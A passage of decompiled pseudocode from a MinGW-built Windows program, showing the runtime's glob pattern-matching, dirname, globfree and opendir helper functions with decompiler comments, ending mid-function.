// 407024: using guessed type int __cpu_features;
//----- (00402270) --------------------------------------------------------
int __usercall sub_402270@<eax>(char *a1@<eax>, unsigned int a2@<edx>)
{
int v2; // ecx
char v3; // bl
int i; // edx
bool v5; // zf
if ( !a1 )
return 0;
v2 = 0;
v3 = ((a2 >> 5) ^ 1) & 1;
LABEL_3:
for ( i = *a1; *a1; v2 = v5 )
{
if ( v3 && i == 127 )
{
if ( !a1[1] )
return 0;
a1 += 2;
}
else
{
++a1;
}
if ( v2 )
{
if ( v2 <= 1 || i != 93 )
{
v2 += i != 33;
goto LABEL_3;
}
return 1;
}
if ( i == 42 || i == 63 )
return 1;
v5 = i == 91;
i = *a1;
}
return i;
}
//----- (00402310) --------------------------------------------------------
int __usercall sub_402310@<eax>(_DWORD *a1@<eax>)
{
int v2; // ebx
_DWORD *v3; // ecx
int result; // eax
int v5; // edx
if ( !a1 )
return 0;
v2 = a1[3] + 1;
v3 = malloc(4 * v2);
a1[2] = v3;
result = 3;
if ( v3 )
{
v5 = v2;
a1[1] = 0;
if ( v2 > 0 )
{
do
v3[--v5] = 0;
while ( v5 );
}
return 0;
}
return result;
}
//----- (00402380) --------------------------------------------------------
char *__usercall sub_402380@<eax>(char *a1@<eax>, int a2@<edx>, __int16 a3@<cx>)
{
char *v3; // edi
int v4; // ebx
int C; // ebp
char *v6; // esi
char v7; // dl
int v8; // esi
int v9; // eax
int v10; // eax
int v11; // ebp
int v12; // edi
char *i; // esi
char v14; // al
char v16; // al
int v17; // edi
int v18; // ebp
char v19; // al
char v22; // [esp+24h] [ebp-28h]
char *v23; // [esp+24h] [ebp-28h]
int v24; // [esp+28h] [ebp-24h]
int v25; // [esp+2Ch] [ebp-20h]
v3 = a1;
v4 = *a1;
C = v4;
if ( v4 != 93 && v4 != 45 )
goto LABEL_3;
if ( v4 == a2 )
{
v3 = a1 + 1;
while ( 1 )
{
v16 = *v3;
if ( *v3 == 93 )
return v3 + 1;
if ( v16 != 127 )
goto LABEL_45;
if ( (a3 & 0x20) != 0 )
{
++v3;
}
else
{
v16 = *++v3;
LABEL_45:
++v3;
if ( !v16 )
return 0;
}
}
}
v4 = a1[1];
v3 = a1 + 1;
LABEL_3:
v24 = ~a2;
v25 = 1 - a2;
while ( 1 )
{
v6 = v3 + 1;
if ( v4 == 93 )
return 0;
if ( v4 != 45 )
{
if ( !v4 )
return 0;
goto LABEL_9;
}
v7 = v3[1];
if ( v7 == 93 )
{
C = 45;
++v3;
goto LABEL_12;
}
v4 = v7;
if ( !v7 )
return 0;
v6 = v3 + 2;
if ( C < v7 )
break;
if ( C > v7 )
{
v23 = v3 + 2;
do
{
v17 = C - 1;
if ( (a3 & 0x4000) != 0 )
{
if ( !(v25 + v17) )
goto LABEL_58;
}
else
{
v18 = tolower(C);
if ( v18 == tolower(a2) )
{
LABEL_58:
i = v23;
while ( 1 )
{
v19 = *i;
if ( *i == 93 )
return i + 1;
if ( v19 != 127 )
goto LABEL_61;
if ( (a3 & 0x20) != 0 )
{
++i;
}
else
{
v19 = *++i;
LABEL_61:
++i;
if ( !v19 )
return 0;
}
}
}
}
C = v17;
}
while ( v4 != v17 );
LABEL_37:
v6 = v23;
}
LABEL_9:
if ( v4 == 47 || v4 == 92 )
return 0;
v7 = *v6;
C = v4;
v3 = v6;
LABEL_12:
if ( (a3 & 0x4000) != 0 )
{
if ( C == a2 )
goto LABEL_17;
}
else
{
v22 = v7;
v8 = tolower(C);
v9 = tolower(a2);
v7 = v22;
if ( v8 == v9 )
{
while ( 1 )
{
LABEL_17:
if ( v7 == 93 )
return v3 + 1;
if ( v7 == 127 )
{
if ( (a3 & 0x20) != 0 )
{
++v3;
goto LABEL_16;
}
v7 = *++v3;
}
++v3;
if ( !v7 )
return 0;
LABEL_16:
v7 = *v3;
}
}
}
v4 = v7;
}
v23 = v3 + 2;
v10 = C;
while ( 1 )
{
v11 = v10 + 1;
if ( (a3 & 0x4000) != 0 )
{
if ( !(v24 + v11) )
break;
goto LABEL_26;
}
v12 = tolower(v10);
if ( v12 == tolower(a2) )
break;
LABEL_26:
v10 = v11;
if ( v4 == v11 )
goto LABEL_37;
}
for ( i = v23; ; ++i )
{
v14 = *i;
if ( *i == 93 )
break;
while ( v14 == 127 )
{
if ( (a3 & 0x20) == 0 )
{
v14 = *++i;
break;
}
v14 = *++i;
if ( *i == 93 )
return i + 1;
}
if ( !v14 )
return 0;
}
return i + 1;
}
//----- (00402640) --------------------------------------------------------
int __usercall sub_402640@<eax>(char *a1@<eax>, _BYTE *a2@<edx>, unsigned int a3@<ecx>)
{
char *v3; // ebp
char v4; // cl
_BYTE *v5; // edi
int C; // edx
char *v7; // esi
char *v8; // eax
int v9; // ebx
int v10; // esi
int v11; // eax
int v12; // esi
int result; // eax
char v14; // dl
_BYTE *v15; // ebx
int v16; // edx
char *v17; // ebx
char v18; // al
int v20; // [esp+1Ch] [ebp-20h]
v3 = a1;
v4 = *a1;
if ( *a2 == 46 && v4 != 46 )
{
result = v4 - 46;
if ( (a3 & 0x10000) == 0 )
return result;
}
v5 = a2 + 1;
LABEL_3:
C = v4;
v7 = v5 - 1;
v8 = v3 + 1;
switch ( v4 )
{
case 0:
return -v7;
case 63:
if ( (v5 - 1) )
{
++v3;
goto LABEL_27;
}
return 63;
case 91:
v16 = (char)(v5 - 1);
if ( !(v5 - 1) )
return 91;
if ( v3[1] != 33 )
{
v3 = sub_402380(v8, v16, a3);
goto LABEL_26;
}
v17 = v3 + 2;
if ( sub_402380(v3 + 2, v16, a3) )
{
v3 += 2;
goto LABEL_26;
}
v18 = v3[2];
if ( v18 == 93 )
{
v17 = v3 + 3;
v18 = v3[3];
}
while ( 1 )
{
if ( v18 == 93 )
{
v3 = v17 + 1;
LABEL_26:
if ( !v3 )
return 93;
LABEL_27:
v4 = *v3;
++v5;
goto LABEL_3;
}
if ( v18 == 127 )
{
if ( (a3 & 0x20) != 0 )
{
++v17;
goto LABEL_43;
}
v18 = *++v17;
}
++v17;
if ( !v18 )
return 93;
LABEL_43:
v18 = *v17;
}
case 42:
v14 = v3[1];
v15 = v3 + 1;
if ( v14 == 42 )
{
do
v14 = *++v15;
while ( v15 == 42 );
}
result = 0;
if ( v14 )
{
do
{
result = sub_402640(a3 | 0x10000, v7);
if ( !result )
break;
++v7;
}
while ( (v7 - 1) );
}
break;
default:
if ( (((unsigned __int8)(a3 >> 5) ^ 1) & 1) == 0 || v4 != 127 || (C = v3[1], v3 += 2, !C) )
v3 = v8;
v9 = (char)(v5 - 1);
if ( (_BYTE)v9 )
{
if ( (a3 & 0x4000) != 0 )
{
v12 = C - v9;
}
else
{
v20 = C;
v10 = tolower(C);
v11 = tolower(v9);
C = v20;
v12 = v10 - v11;
}
if ( !v12 )
goto LABEL_27;
}
else
{
v9 = 0;
}
return C - v9;
}
return result;
}
//----- (00402860) --------------------------------------------------------
int __usercall sub_402860@<eax>(int a1@<eax>, int a2@<edx>)
{
_DWORD v4; // eax
int v5; // ecx
int v6; // edx
v4 = realloc((void **)(a2 + 8), 4 * ((_DWORD *)(a2 + 4) + *(_DWORD *)(a2 + 12)) + 8);
if ( !v4 )
return 1;
v5 = *(_DWORD *)(a2 + 4);
v6 = *(_DWORD *)(a2 + 12);
*(_DWORD *)(a2 + 8) = v4;
*(_DWORD *)(a2 + 4) = v5 + 1;
v4[v6 + v5] = a1;
v4[v5 + 1 + v6] = 0;
return 0;
}
//----- (004028C0) --------------------------------------------------------
void __usercall sub_4028C0(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
int v5; // eax
if ( a1 )
((void ()(void))sub_4028C0)();
v5 = a1[2];
if ( v5 && a2 )
sub_402860(v5, a2);
if ( a1[1] )
sub_4028C0(a3, a2);
free(a1);
}
// 4028E8: variable 'a3' is possibly undefined
//----- (00402910) --------------------------------------------------------
int __usercall sub_402910@<eax>(const char *a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>, int a4)
{
char *v4; // ebx
size_t v5; // eax
size_t v6; // edx
int v7; // eax
void *v8; // esp
void *v9; // esp
char *v10; // eax
char *v11; // esi
unsigned int v12; // edi
unsigned int v13; // edx
char v14; // al
char *v15; // eax
char v16; // cl
char *v17; // edx
char v18; // al
char *v19; // edx
char j; // si
char *v21; // eax
HANDLE *v22; // edi
int v23; // esi
size_t v24; // edx
int v25; // eax
void *v26; // esp
void *v27; // esp
int v28; // eax
void *v29; // esp
void *v30; // esp
char *v31; // eax
char *v32; // esi
char v33; // dl
char v34; // dl
char *v35; // esi
_DWORD *v36; // ebx
unsigned int v37; // edi
int v38; // eax
_DWORD *v39; // edx
_DWORD *v40; // ecx
const char *v41; // eax
_DWORD *v42; // eax
int v43; // edx
int v45; // eax
void *v46; // esp
void *v47; // esp
char *v48; // esi
char *v49; // edi
char v50; // al
char *v51; // edi
_BYTE *v52; // edx
int v53; // ecx
char v54; // al
char v55; // al
bool v56; // bl
char *v57; // eax
int v58; // esi
char v59; // bl
_BYTE *v60; // ecx
char *v61; // ecx
char i; // al
unsigned int v63; // esi
int v64; // eax
int v65; // eax
void *v66; // esp
char *v67; // edx
void *v68; // esp
char *v69; // ecx
char v70; // al
char *v71; // eax
int v72; // ecx
void *v73; // edi
void **v74; // ebx
_DWORD *v75; // edi
void **v76; // eax
void *v77; // eax
char v78; // al
int (__cdecl *v79)(_DWORD, const char *); // edi
void **v80; // esi
int v81; // eax
void *v82; // esp
void *v83; // esp
char *v84; // edx
char v85; // al
char *v86; // eax
char v87; // bl
char *v88; // [esp+0h] [ebp-78h] BYREF
const char *v89; // [esp+4h] [ebp-74h]
char String[15]; // [esp+Ch] [ebp-6Ch] BYREF
char v92; // [esp+1Bh] [ebp-5Dh]
char *v93; // [esp+1Ch] [ebp-5Ch]
const char **v94; // [esp+20h] [ebp-58h]
size_t v95; // [esp+24h] [ebp-54h]
const char **v96; // [esp+28h] [ebp-50h]
size_t v97; // [esp+2Ch] [ebp-4Ch]
_DWORD *v98; // [esp+30h] [ebp-48h]
void *Block; // [esp+34h] [ebp-44h]
size_t Size; // [esp+38h] [ebp-40h]
int (__cdecl *v101)(_DWORD, const char *); // [esp+3Ch] [ebp-3Ch]
char *v102; // [esp+40h] [ebp-38h]
int v103; // [esp+44h] [ebp-34h]
unsigned int v104; // [esp+48h] [ebp-30h]
char *Str; // [esp+4Ch] [ebp-2Ch]
_DWORD v106[2]; // [esp+50h] [ebp-28h] BYREF
_DWORD *v107; // [esp+58h] [ebp-20h]
int v108; // [esp+5Ch] [ebp-1Ch]
v4 = (char *)a1;
v104 = a2;
v101 = (int (__cdecl *)(_DWORD, const char *))a3;
if ( (a2 & 0x400) != 0 )
{
Size = (size_t)&v88;
v45 = 16 * ((strlen(a1) + 16) >> 4);
v46 = alloca(v45);
v47 = alloca(v45);
v48 = v4;
v49 = String;
v102 = String;
v50 = *v4;
while ( 1 )
{
if ( v50 != 127 )
{
LABEL_54:
if ( v50 != 123 )
goto LABEL_55;
v103 = (int)v49;
v51 = v48;
while ( 1 )
{
v52 = (_BYTE *)v103;
v53 = 1;
LABEL_61:
v54 = v51[1];
if ( v54 != 127 )
{
LABEL_62:
++v51;
goto LABEL_63;
}
while ( 1 )
{
v55 = v51[2];
*v52 = 127;
v52[1] = v55;
if ( !v55 )
{
v52[2] = 0;
return 1;
}
v54 = v51[3];
v52 += 2;
v51 += 3;
LABEL_63:
if ( v54 != 125 && (v54 != 44 || v53 != 1) )
{
if ( v54 == 123 )
{
++v53;
v56 = 1;
LOBYTE(Str) = 1;
}
else
{
LOBYTE(Str) = v54 != 0;
v56 = v54 != 0;
}
*v52 = v54;
if ( v56 )
{
++v52;
goto LABEL_61;
}
if ( (_BYTE)Str )
{
++v52;
if ( v54 == 44 )
goto LABEL_79;
LABEL_96:
*v52 = 0;
return 1;
}
return 1;
}
if ( !--v53 )
break;
*v52 = v54;
v54 = v51[1];
++v52;
if ( v54 != 127 )
goto LABEL_62;
}
if ( v54 == 44 )
{
LABEL_79:
v57 = v51;
v58 = 1;
do
{
while ( 1 )
{
while ( 1 )
{
v59 = v57[1];
v60 = v57 + 1;
if ( v59 == 127 )
{
if ( !v57[2] )
goto LABEL_96;
while ( 1 )
{
v59 = v60[2];
v57 = v60 + 2;
if ( v59 != 127 )
break;
if ( !v60[3] )
goto LABEL_96;
v60 += 2;
}
}
else
{
++v57;
}
if ( v59 != 123 )
break;
++v58;
}
if ( v59 != 125 )
break;
if ( !--v58 )
goto LABEL_89;
}
}
while ( v59 );
goto LABEL_96;
}
v57 = v51;
LABEL_89:
v61 = v57 + 1;
for ( i = v57[1]; ; i = *v61 )
{
++v52;
++v61;
*(v52 - 1) = i;
if ( !i )
break;
}
v63 = v104 | 1;
v64 = sub_402910(v101, v104, a4);
v104 = v63;
if ( v64 == 1 )
return 1;
if ( *v51 != 44 )
return v64;
}
}
while ( 1 )
{
v50 = v48[1];
*v49 = 127;
if ( v50 )
break;
++v49;
++v48;
LABEL_55:
*v49 = v50;
if ( !v50 )
goto LABEL_2;
v50 = v48[1];
++v49;
++v48;
if ( v50 != 127 )
goto LABEL_54;
}
v49[1] = v50;
v48 += 2;
v50 = *v48;
v49 += 2;
}
}
LABEL_2:
v94 = (const char **)&v88;
v5 = strlen(v4);
v6 = v5 + 1;
v7 = 16 * ((v5 + 16) >> 4);
v8 = alloca(v7);
v9 = alloca(v7);
v10 = (char *)memcpy(String, v4, v6);
Str = __mingw_dirname(v10);
v11 = Str;
v108 = 0;
v103 = sub_402310(v106);
if ( !v103 )
{
v12 = v104;
if ( sub_402270(v11, v104) )
{
v13 = v12;
BYTE1(v13) = BYTE1(v12) | 0x80;
v103 = sub_402910(v101, v13, v106);
}
else
{
v65 = 16 * ((strlen(Str) + 16) >> 4);
v66 = alloca(v65);
v67 = Str;
v68 = alloca(v65);
v69 = String;
do
{
v70 = *v67;
if ( *v67 == 127 )
v70 = *++v67;
++v69;
++v67;
*(v69 - 1) = v70;
}
while ( v70 );
v71 = strdup(String);
if ( !v71 )
return 1;
v103 = sub_402860((int)v71, (int)v106);
}
if ( !v103 )
{
v14 = v4[1];
if ( v14 == 47 || v14 == 92 || strcmp(Str, ""."") )
{
v15 = &v4[strlen(Str)];
if ( v4 >= v15 )
{
v87 = *v15;
v102 = v15;
v92 = v87;
}
else
{
v92 = *v15;
if ( v92 == 47 || v92 == 92 )
{
v102 = v15;
}
else
{
do
{
v17 = v15 - 1;
if ( v4 == v15 - 1 )
{
v18 = *(v15 - 1);
v102 = v17;
v92 = v18;
goto LABEL_17;
}
v16 = *--v15;
}
while ( v16 != 47 && v16 != 92 );
v102 = v17;
v92 = v16;
}
}
LABEL_17:
if ( v92 == 47 || v92 == 92 )
{
v19 = v102;
for ( j = v92; *++v19 == 92 || *v19 == 47; j = *v19 )
;
v102 = v19;
v92 = j;
v93 = Str;
}
else
{
v92 = 92;
v93 = Str;
}
}
else
{
if ( (v104 & 0x10) != 0 )
{
v103 = sub_402270(v4, v104);
if ( !v103 )
{
v81 = 16 * ((strlen(v4) + 16) >> 4);
v82 = alloca(v81);
v83 = alloca(v81);
v84 = String;
do
{
v85 = *v4;
if ( *v4 == 127 )
v85 = *++v4;
++v84;
++v4;
*(v84 - 1) = v85;
}
while ( v85 );
v86 = strdup(String);
if ( v86 && a4 )
{
sub_402860((int)v86, a4);
Block = v107;
}
else
{
LABEL_131:
Block = v107;
}
goto LABEL_121;
}
}
v102 = v4;
v92 = 92;
v93 = 0;
}
v103 = 2;
Block = v107;
v21 = (char *)*v107;
Str = (char *)(v104 & 0x8000);
if ( !v21 )
goto LABEL_121;
LABEL_24:
v22 = (HANDLE )__mingw_opendir(v21);
if ( v22 )
{
if ( v93 )
Size = strlen((const char **)Block);
else
Size = 0;
v98 = 0;
v95 = Size + 2;
while ( 1 )
{
while ( 1 )
{
LABEL_28:
v23 = __mingw_readdir((int)v22);
if ( !v23 )
{
__mingw_closedir(v22);
if ( v98 )
sub_4028C0(v98, a4, v72);
LABEL_110:
v73 = Block;
v74 = (void **)((char )Block + 4);
free((void **)Block);
v21 = (char )((_DWORD *)v73 + 1);
if ( !v21 )
goto LABEL_131;
if ( v103 == 1 )
goto LABEL_118;
Block = v74;
goto LABEL_24;
}
if ( Str && *(_DWORD *)(v23 + 8) != 16 || sub_402640(v102, (_BYTE *)(v23 + 12), v104) )
continue;
v24 = *(unsigned __int16 *)(v23 + 6);
v96 = (const char **)&v88;
v25 = 16 * ((v24 + v95 + 15) >> 4);
v26 = alloca(v25);
v27 = alloca(v25);
v97 = 0;
if ( Size )
{
v97 = v24;
memcpy(String, *(const void **)Block, Size);
v24 = v97;
v78 = String[Size - 1];
if ( v78 == 47 || v78 == 92 )
{
v97 = Size;
}
else
{
v97 = Size + 1;
String[Size] = v92;
}
}
memcpy(&String[v97], (const void *)(v23 + 12), v24 + 1);
v28 = 16 * ((strlen(String) + 16) >> 4);
v29 = alloca(v28);
v30 = alloca(v28);
v31 = String;
v32 = String;
do
{
while ( 1 )
{
v33 = *v31;
if ( *v31 == 127 )
break;
++v32;
++v31;
*(v32 - 1) = v33;
if ( !v33 )
goto LABEL_37;
}
v34 = v31[1];
++v32;
v31 += 2;
*(v32 - 1) = v34;
}
while ( v34 );
LABEL_37:
v35 = strdup(String);
if ( !v35 )
{
v103 = 3;
continue;
}
v103 = v103 == 2 ? 0 : v103;
if ( (v104 & 0x40) != 0 )
{
if ( a4 )
sub_402860((int)v35, a4);
continue;
}
v36 = v98;
if ( v98 )
break;
v42 = malloc(0xCu);
if ( v42 )
{
v42[2] = v35;
v42[1] = 0;
*v42 = 0;
goto LABEL_130;
}
}
v97 = (size_t)v22;
v37 = v104 & 0x4000;
while ( 1 )
{
v41 = (const char *)v36[2];
v88 = v35;
v89 = v41;
if ( !v37 )
break;
v38 = strcoll(v88, v89);
v39 = (_DWORD *)*v36;
v40 = (_DWORD *)v36[1];
if ( v38 <= 0 )
goto LABEL_46;
LABEL_42:
if ( !v40 )
goto LABEL_47;
LABEL_43:
v36 = v40;
}
v38 = stricoll(v88, v89);
v39 = (_DWORD *)*v36;
v40 = (_DWORD *)v36[1];
if ( v38 > 0 )
goto LABEL_42;
LABEL_46:
v40 = v39;
if ( v39 )
goto LABEL_43;
LABEL_47:
v22 = (HANDLE *)v97;
v97 = v38;
v42 = malloc(0xCu);
if ( v42 )
{
v43 = v97;
v42[2] = v35;
v42[1] = 0;
*v42 = 0;
if ( v43 > 0 )
{
v36[1] = v42;
goto LABEL_28;
}
*v36 = v42;
if ( !v98 )
LABEL_130:
v98 = v42;
}
}
}
if ( (v104 & 4) != 0 )
{
v75 = Block;
v74 = (void **)((char )Block + 4);
v76 = (void **)Block;
}
else
{
v79 = v101;
if ( !v101 )
goto LABEL_110;
v89 = (const char )_errno();
v80 = (void **)Block;
if ( !v79((_DWORD *)Block, v89) )
goto LABEL_110;
v76 = v80;
v74 = v80 + 1;
v75 = v80;
}
free(*v76);
if ( v75[1] )
{
LABEL_118:
v77 = (void )((_DWORD *)Block + 1);
do
{
++v74;
free(v77);
v77 = *v74;
}
while ( *v74 );
}
v103 = 1;
Block = v107;
LABEL_121:
free(Block);
}
}
return v103;
}
// 402CC3: conditional instruction was optimized away because al.1 is in (1..7A|7C..7E|<0)
// 40317F: conditional instruction was optimized away because al.1==0
// 402F18: variable 'v72' is possibly undefined
// 402910: using guessed type _DWORD var_28[2];
// 402910: using guessed type char String[15];
//----- (004031A0) --------------------------------------------------------
int *__cdecl __mingw_glob(char *Str, int a2, int a3, char **a4)
{
char *v4; // ebx
int v5; // ecx
int v7; // eax
void *v8; // esp
void *v9; // esp
char *v10; // edx
char v11; // al
char v12; // al
char *v13; // eax
int v14; // [esp+0h] [ebp-38h] BYREF
char String[20]; // [esp+4h] [ebp-34h] BYREF
int v16; // [esp+18h] [ebp-20h]
int *v17; // [esp+1Ch] [ebp-1Ch]
v4 = Str;
if ( a4 && (a2 & 2) == 0 )
a4[3] = 0;
if ( *a4 != ""glob-1.0-mingw32"" )
{
sub_402310(a4);
*a4 = ""glob-1.0-mingw32"";
}
v5 = sub_402910(Str, a2, a3, (int)a4);
if ( v5 == 2 && (a2 & 0x10) != 0 )
{
v16 = 2;
v17 = &v14;
v7 = 16 * ((strlen(Str) + 16) >> 4);
v8 = alloca(v7);
v9 = alloca(v7);
v10 = String;
do
{
while ( 1 )
{
v11 = *v4;
if ( *v4 == 127 )
break;
++v10;
++v4;
*(v10 - 1) = v11;
if ( !v11 )
goto LABEL_13;
}
v12 = v4[1];
++v10;
v4 += 2;
*(v10 - 1) = v12;
}
while ( v12 );
LABEL_13:
v16 = 2;
v13 = strdup(String);
v5 = v16;
if ( v13 )
{
v17 = (int *)v16;
sub_402860((int)v13, (int)a4);
return v17;
}
}
return (int *)v5;
}
//----- (00403290) --------------------------------------------------------
void __cdecl __mingw_globfree(void *a1)
{
int v1; // eax
int v2; // edi
int v3; // ebx
void *Block; // eax
if ( *(char **)a1 == ""glob-1.0-mingw32"" )
{
v1 = *((_DWORD *)a1 + 1);
v2 = v1 - 1;
v3 = 4 * *((_DWORD *)a1 + 3);
if ( v1 > 0 )
{
do
{
--v2;
Block = (void **)(((_DWORD )a1 + 2) + v3);
v3 += 4;
free(Block);
}
while ( v2 != -1 );
}
free(((void **)a1 + 2));
}
}
//----- (004032F0) --------------------------------------------------------
char *__cdecl __mingw_dirname(char *Source)
{
char *v1; // eax
char *v2; // ebx
size_t v3; // esi
size_t v5; // edx
int v6; // eax
void *v7; // esp
void *v8; // esp
bool v9; // cc
_WORD *v10; // ecx
wchar_t v11; // dx
_WORD *v12; // esi
__int16 v13; // dx
_WORD *i; // eax
size_t v15; // eax
_WORD *v16; // eax
char *v17; // esi
_WORD *v18; // eax
__int16 v19; // dx
wchar_t *p_Dest; // ecx
wchar_t v21; // dx
wchar_t *v22; // eax
size_t v23; // eax
size_t v24; // eax
__int16 v25; // dx
int v26; // [esp+0h] [ebp-38h] BYREF
wchar_t Dest; // [esp+Ch] [ebp-2Ch] BYREF
__int16 v28; // [esp+Eh] [ebp-2Ah]
size_t v29[2]; // [esp+10h] [ebp-28h] BYREF
wchar_t v30; // [esp+1Ah] [ebp-1Eh]
size_t MaxCount; // [esp+1Ch] [ebp-1Ch]
v1 = setlocale(2, 0);
v2 = v1;
if ( v1 )
v2 = strdup(v1);
setlocale(2, Locale);
if ( !Source || !*Source )
goto LABEL_5;
v29[1] = (size_t)&v26;
v5 = mbstowcs(0, Source, 0);
v6 = 16 * ((2 * v5 + 18) >> 4);
v7 = alloca(v6);
v8 = alloca(v6);
v29[0] = mbstowcs(&Dest, Source, v5);
v9 = v29[0] <= 1;
*(&Dest + v29[0]) = 0;
MaxCount = (size_t)&Dest;
v30 = Dest;
if ( !v9 )
{
if ( Dest == 47 || Dest == 92 )
{
if ( v30 == v28 && !LOWORD(v29[0]) )
{
setlocale(2, v2);
free(v2);
return Source;
}
}
else if ( v28 == 58 )
{
MaxCount = (size_t)v29;
v30 = v29[0];
}
}
if ( !v30 )
{
LABEL_5:
v3 = wcstombs(0, ::Source, 0) + 1;
Block = realloc(Block, v3);
wcstombs((char *)Block, ::Source, v3);
setlocale(2, v2);
free(v2);
return (char *)Block;
}
v10 = (_WORD *)MaxCount;
v11 = v30;
v12 = (_WORD *)MaxCount;
do
{
while ( v11 != 47 && v11 != 92 )
{
v11 = v10[1];
++v10;
if ( !v11 )
goto LABEL_21;
}
v13 = *v10;
for ( i = v10; *i == 47; v13 = *i )
LABEL_17:
++i;
if ( v13 == 92 )
goto LABEL_17;
if ( !v13 )
break;
v11 = i[1];
v12 = i;
v10 = i + 1;
}
while ( v11 );
LABEL_21:
if ( MaxCount < (unsigned int)v12 )
{
while ( 1 )
{
v18 = v12 - 1;
if ( MaxCount >= (unsigned int)(v12 - 1) )
break;
v19 = *--v12;
if ( v19 != 47 && v19 != 92 )
goto LABEL_30;
}
if ( (_WORD *)MaxCount == v12 - 1 && (v30 == 47 || v30 == 92) && *v12 == v30 )
{
v25 = v18[2];
if ( v25 != 47 && v25 != 92 )
v18 = v12;
}
LABEL_30:
p_Dest = &Dest;
v18[1] = 0;
v21 = Dest;
if ( Dest == 47 || Dest == 92 )
{
do
{
do
++p_Dest;
while ( *p_Dest == 47 );
}
while ( *p_Dest == 92 );
if ( (char *)p_Dest - (char *)&Dest > 5 )
goto LABEL_35;
}
if ( v28 != Dest )
LABEL_35:
p_Dest = &Dest;
else
v21 = *p_Dest;
v22 = p_Dest;
while ( v21 )
{
while ( 1 )
{
*p_Dest++ = v21;
if ( v21 == 47 )
break;
if ( *v22 == 92 )
{
++v22;
break;
}
v21 = v22[1];
++v22;
if ( !v21 )
goto LABEL_41;
}
v21 = *v22;
if ( *v22 == 92 || v21 == 47 )
{
do
{
do
v21 = *++v22;
while ( *v22 == 47 );
}
while ( v21 == 92 );
}
}
LABEL_41:
v23 = v29[0];
*p_Dest = 0;
v24 = wcstombs(Source, &Dest, v23);
v17 = Source;
if ( v24 != -1 )
Source[v24] = 0;
}
else
{
if ( v30 == 47 || v30 == 92 )
{
v16 = (_WORD *)(MaxCount + 2);
}
else
{
v15 = MaxCount;
*(_WORD *)MaxCount = 46;
v16 = (_WORD *)(v15 + 2);
}
*v16 = 0;
MaxCount = wcstombs(0, &Dest, 0) + 1;
Block = realloc(Block, MaxCount);
v17 = (char *)Block;
wcstombs((char *)Block, &Dest, MaxCount);
}
setlocale(2, v2);
free(v2);
return v17;
}
//----- (004036F0) --------------------------------------------------------
HANDLE __usercall sub_4036F0@<eax>(const CHAR *lpFileName@<eax>, int a2@<edx>)
{
HANDLE FirstFileA; // esi
CHAR *v4; // ecx
unsigned __int16 i; // ax
CHAR v6; // al
DWORD dwFileAttributes; // eax
int *v9; // ebx
DWORD LastError; // eax
struct _WIN32_FIND_DATAA FindFileData; // [esp+10h] [ebp-14Ch] BYREF
FirstFileA = FindFirstFileA(lpFileName, &FindFileData);
if ( FirstFileA == (HANDLE)-1 )
{
v9 = _errno();
LastError = GetLastError();
*v9 = LastError;
if ( LastError == 3 )
{
*_errno() = 2;
}
else if ( *_errno() == 267 )
{
*_errno() = 20;
}
else if ( *_errno() != 2 )
{
*_errno() = 22;
}
return FirstFileA;
}
v4 = (CHAR *)(a2 + 12);
*(_WORD *)(a2 + 6) = 0;
for ( i = 0; ; v4 += i < 0x104u )
{
v6 = FindFileData.cFileName[i];
*v4 = v6;
if ( !v6 )
break;
i = *(_WORD *)(a2 + 6) + 1;
*(_WORD *)(a2 + 6) = i;
}
dwFileAttributes = FindFileData.dwFileAttributes;
LOBYTE(dwFileAttributes) = FindFileData.dwFileAttributes & 0x58;
if ( dwFileAttributes > 0x10 )
{
*(_DWORD *)(a2 + 8) = 24;
return FirstFileA;
}
*(_DWORD *)(a2 + 8) = dwFileAttributes;
return FirstFileA;
}
//----- (004037C0) --------------------------------------------------------
BOOL __usercall sub_4037C0@<eax>(void *hFindFile@<eax>, int a2@<edx>)
{
BOOL NextFileA; // esi
CHAR *v4; // ecx
unsigned __int16 i; // ax
CHAR v6; // al
DWORD dwFileAttributes; // eax
struct _WIN32_FIND_DATAA FindFileData; // [esp+10h] [ebp-14Ch] BYREF
NextFileA = FindNextFileA(hFindFile, &FindFileData);
if ( NextFileA )
{
v4 = (CHAR *)(a2 + 12);
*(_WORD *)(a2 + 6) = 0;
for ( i = 0; ; v4 += i < 0x104u )
{
v6 = FindFileData.cFileName[i];
*v4 = v6;
if ( !v6 )
break;
i = *(_WORD *)(a2 + 6) + 1;
*(_WORD *)(a2 + 6) = i;
}
dwFileAttributes = FindFileData.dwFileAttributes;
LOBYTE(dwFileAttributes) = FindFileData.dwFileAttributes & 0x58;
if ( dwFileAttributes <= 0x10 )
{
*(_DWORD *)(a2 + 8) = dwFileAttributes;
return NextFileA;
}
*(_DWORD *)(a2 + 8) = 24;
return NextFileA;
}
else
{
if ( GetLastError() == 18 )
return NextFileA;
*_errno() = 2;
return 0;
}
}
//----- (00403870) --------------------------------------------------------
int __cdecl __mingw_opendir(char *Path)
{
char *v1; // eax
int v2; // ecx
unsigned int v3; // edx
int v4; // eax
char v5; // dl
int v6; // ecx
unsigned int v7; // edx
char *v8; // kr00_4
char *v9; // eax
int v10; // esi
const CHAR *v11; // ebp
HANDLE v12; // eax
char *Buffer; // [esp+0h] [ebp-13Ch]
char Src[288]; // [esp+1Ch] [ebp-120h] BYREF
if ( Path )
{
if ( *Path )
{
_fullpath(Src, Path, 0x104u);
v1 = Src;
if ( Src[0] )
{
do
{
v2 = *(_DWORD *)v1;
v1 += 4;
v3 = ~v2 & (v2 - 16843009) & 0x80808080;
}
while ( !v3 );
if ( (~v2 & (v2 - 16843009) & 0x8080) == 0 )
{
v3 >>= 16;
v1 += 2;
}
v4 = &v1[-CFADD((_BYTE)v3, (_BYTE)v3) - 3] - Src;
v5 = Src[v4 - 1];
if ( v5 != 47 && v5 != 92 )
*(_WORD *)&Src[v4++] = 92;
}
else
{
do
{
v6 = *(_DWORD *)v1;
v1 += 4;
v7 = ~v6 & (v6 - 16843009) & 0x80808080;
}
while ( !v7 );
if ( (~v6 & (v6 - 16843009) & 0x8080) == 0 )
{
v7 >>= 16;
v1 += 2;
}
v4 = &v1[-CFADD((_BYTE)v7, (_BYTE)v7) - 3] - Src;
}
*(_WORD *)&Src[v4] = 42;
v8 = &Src[strlen(Src)];
v9 = (char *)malloc(v8 - Src + 284);
v10 = (int)v9;
if ( v9 )
{
v11 = v9 + 280;
memcpy(v9 + 280, Src, v8 - Src + 1);
v12 = sub_4036F0(v11, v10);
*(_DWORD *)(v10 + 272) = v12;
if ( v12 == (HANDLE)-1 )
{
Buffer = (char *)v10;
v10 = 0;
free(Buffer);
}
else
{
